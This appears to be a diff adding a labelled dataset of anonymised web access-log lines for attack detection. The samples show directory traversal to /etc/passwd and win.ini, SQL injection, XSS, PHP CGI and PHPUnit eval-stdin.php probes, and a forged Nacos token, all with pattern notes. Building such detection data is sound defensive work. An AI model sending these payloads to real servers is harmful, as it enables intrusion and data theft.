@@ -1,0 +1,114 @@
+# Malicious Log Samples
+
+## Individual Attack Examples
+
+### Directory Traversal Attempt
+XXX.XXX.XXX.XXX - - [17/Nov/2024:10:15:30 +0900] "GET /../../../etc/passwd HTTP/1.1" 404 162 "" "curl/7.68.0" -
+
+### SQL Injection Attempt  
+XXX.XXX.XXX.XXX - - [17/Nov/2024:11:22:15 +0900] "GET /search?q=1' OR '1'='1 HTTP/1.1" 200 1024 "" "python-requests/2.25.1" -
+
+### XSS Attempt
+XXX.XXX.XXX.XXX - - [17/Nov/2024:12:45:22 +0900] "GET /comment?text=<script>alert('xss')</script> HTTP/1.1" 200 512 "" "Mozilla/5.0 (compatible; TestBot)" -
+
+### PHP CGI-bin Vulnerability Attempt
+XXX.XXX.XXX.XXX - - [17/Nov/2024:13:30:45 +0900] "GET /cgi-bin/php?-d+allow_url_include%3don HTTP/1.1" 404 256 "" "curl/7.58.0" -
+
+## Sequence Examples
+
+### Sequence 1: Reconnaissance and Login Path Discovery (Length=3, IP-based grouping)
+```
+XXX.XXX.XXX.XXX - - [17/Nov/2024:18:32:39 +0900] "GET / HTTP/1.1" 301 162 "" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" -
+XXX.XXX.XXX.XXX - - [17/Nov/2024:18:32:39 +0900] "GET / HTTP/2.0" 302 102 "http://git.example.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" -
+XXX.XXX.XXX.XXX - - [17/Nov/2024:18:32:40 +0900] "GET /users/sign_in HTTP/2.0" 200 4636 "https://git.example.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" -
+```
+**Label**: Malicious (1)  
+**Temporal Window**: 1 second
+**Pattern**: Systematic login page discovery (browser-like User-Agent but automated behavior)
+
+### Sequence 2: Multiple Login Path Probing (Length=3, IP-based grouping)
+```
+XXX.XXX.XXX.XXX - - [17/Nov/2024:18:32:40 +0900] "GET /app/ HTTP/2.0" 302 102 "" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" -
+XXX.XXX.XXX.XXX - - [17/Nov/2024:18:32:40 +0900] "GET /users/sign_in HTTP/2.0" 200 4629 "https://git.example.org/app/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" -
+XXX.XXX.XXX.XXX - - [17/Nov/2024:18:32:40 +0900] "GET /login/ HTTP/2.0" 302 102 "" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" -
+```
+**Label**: Malicious (1)
+**Temporal Window**: <1 second  
+**Pattern**: Rapid probing of alternative login paths (/app/, /login/)
+
+### Sequence 3: Suspicious Resource Access (Length=3, IP-based grouping)
+```
+XXX.XXX.XXX.XXX - - [17/Nov/2024:18:32:42 +0900] "GET /assets/webpack/commons-pages.admin.sessions-pages.sessions-pages.sessions.new.f7871679.chunk.js HTTP/2.0" 200 3901 "" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" -
+XXX.XXX.XXX.XXX - - [17/Nov/2024:18:32:42 +0900] "GET /assets/webpack/commons-pages.admin.sessions-pages.sessions-pages.sessions.new.f7871679.chunk.js.map HTTP/2.0" 200 13484 "" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" -
+XXX.XXX.XXX.XXX - - [17/Nov/2024:18:32:42 +0900] "GET /assets/webpack/main.8ef36d88.chunk.js HTTP/2.0" 200 307385 "" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" -
+```
+**Label**: Malicious (1)
+**Temporal Window**: <1 second
+**Pattern**: Automated asset enumeration (including source maps, indicating reconnaissance intent)
+
+### Sequence 4: PHP CGI-bin Vulnerability Exploitation (Length=3, IP-based grouping)
+```
+XXX.XXX.XXX.XXX - - [19/Nov/2024:19:40:11 +0900] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 112 "" "Custom-AsyncHttpClient" -
+XXX.XXX.XXX.XXX - - [19/Nov/2024:19:40:12 +0900] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 112 "" "Custom-AsyncHttpClient" -
+XXX.XXX.XXX.XXX - - [19/Nov/2024:19:40:12 +0900] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 112 "" "Custom-AsyncHttpClient" -
+```
+**Label**: Malicious (1)
+**Temporal Window**: 1 second
+**Pattern**: Systematic PHPUnit eval-stdin.php vulnerability scanning (known RCE exploit path)
+
+### Sequence 5: Directory Traversal Attack Series (Length=3, IP-based grouping)
+```
+XXX.XXX.XXX.XXX - - [24/Nov/2024:18:43:54 +0900] "GET /him/api/rest/V1.0/system/log/list?filePath=../ HTTP/1.1" 302 113 "" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" -
+XXX.XXX.XXX.XXX - - [24/Nov/2024:18:43:54 +0900] "GET /lib///....//....//....//....//....//....//....//....//etc//passwd HTTP/1.1" 302 113 "" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" -
+XXX.XXX.XXX.XXX - - [24/Nov/2024:18:43:54 +0900] "GET /register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 302 113 "" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" -
+```
+**Label**: Malicious (1)
+**Temporal Window**: <1 second
+**Pattern**: Multiple directory traversal techniques targeting /etc/passwd (URL encoding bypass and path depth variation)
+
+### Sequence 6: Windows Directory Traversal (Length=3, IP-based grouping)
+```
+XXX.XXX.XXX.XXX - - [24/Nov/2024:18:43:54 +0900] "GET /Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/ HTTP/1.1" 302 113 "" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" -
+XXX.XXX.XXX.XXX - - [24/Nov/2024:18:43:54 +0900] "POST /fileDownload?action=downloadBackupFile HTTP/1.1" 404 842 "" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" 1.92
+XXX.XXX.XXX.XXX - - [24/Nov/2024:18:43:54 +0900] "PUT /funudh.txt HTTP/1.1" 404 842 "" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" 1.92
+```
+**Label**: Malicious (1)
+**Temporal Window**: <1 second  
+**Pattern**: Windows-specific traversal with URL encoding (%5C for backslash) and file upload attempts
+
+### Sequence 7: SQL Injection Attack Series (Length=3, IP-based grouping)
+```
+XXX.XXX.XXX.XXX - - [24/Nov/2024:18:43:58 +0900] "GET /images/lists?cid=1%20)%20ORDER%20BY%201%20desc,extractvalue(rand(),concat(0x7c,md5(855087815)))%20desc%20--+a HTTP/1.1" 302 113 "" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" -
+XXX.XXX.XXX.XXX - - [24/Nov/2024:18:43:58 +0900] "GET /nagiosql/admin/commandline.php?cname=%27%20union%20select%20concat(md5(2035371243))%23 HTTP/1.1" 302 113 "" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" -
+XXX.XXX.XXX.XXX - - [24/Nov/2024:18:43:58 +0900] "GET /nagiosql/admin/info.php?key1=%27%20union%20select%20concat(md5(2027792153))%23 HTTP/1.1" 302 113 "" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" -
+```
+**Label**: Malicious (1)
+**Temporal Window**: <1 second
+**Pattern**: Advanced SQL injection techniques including ORDER BY enumeration, extractvalue() function abuse, and UNION-based attacks with hash verification
+
+### Sequence 8: XSS Attack with Service Reconnaissance (Length=3, IP-based grouping)
+```
+XXX.XXX.XXX.XXX - - [11/Dec/2024:08:33:25 +0900] "GET /nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1" 301 162 "" "Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36" -
+XXX.XXX.XXX.XXX - - [11/Dec/2024:08:33:26 +0900] "GET /wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php HTTP/1.1" 301 162 "" "Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" -
+XXX.XXX.XXX.XXX - - [11/Dec/2024:08:33:45 +0900] "GET /bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=<img%20onerror=alert(document.domain)%20src=1> HTTP/1.1" 301 162 "" "Mozilla/5.0 (Ubuntu; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0" -
+```
+**Label**: Malicious (1)
+**Temporal Window**: 20 seconds
+**Pattern**: Multi-service reconnaissance (Nacos, WordPress) followed by XSS payload injection using img onerror event handler
+
+---
+
+# Attack Classification Summary:
+- **Common Web Attack**: Reconnaissance, login path discovery, asset enumeration
+- **Directory Traversal**: Path traversal attempts, file access probing  
+- **SQL Injection**: Database query manipulation attempts
+- **XSS Attempts**: Cross-site scripting payload injection
+- **PHP CGI-bin Vulnerability**: CGI exploitation attempts
+
+# Notes:
+- All IP addresses anonymized as XXX.XXX.XXX.XXX
+- Domain names changed to example.org
+- Attack payloads preserved for pattern recognition
+- User-Agent strings show mix of legitimate browsers (spoofed) and tools
+- Sequences demonstrate temporal attack patterns crucial for detection
+- Response times indicate server processing of malicious requests
